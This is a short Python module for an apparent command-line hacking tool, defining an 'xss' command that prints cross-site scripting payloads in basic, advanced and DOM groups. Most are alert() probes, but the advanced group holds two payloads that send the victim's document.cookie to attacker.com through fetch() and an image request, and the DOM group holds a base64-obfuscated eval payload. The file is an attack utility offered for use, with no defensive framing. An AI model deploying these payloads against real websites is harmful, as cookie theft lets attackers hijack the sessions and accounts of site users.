"""XSS payload generator"""

from Commands import Command

class XssCommand(Command):
    name = "xss"
    description = "XSS payload generator"
    usage = "xss [type]"
    
    def execute(self, args):
        type_ = args[0] if args else "basic"
        
        payloads = {
            "basic": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>"
            ],
            "advanced": [
                "<img src=x onerror=\"fetch('http://attacker.com/?cookie='+document.cookie)\">",
                "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>"
            ],
            "dom": [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">"
            ]
        }
        
        print(f"\n[*] XSS Payloads ({type_}):")
        
        for payload in payloads.get(type_, payloads["basic"]):
            print(f"[+] {payload}")
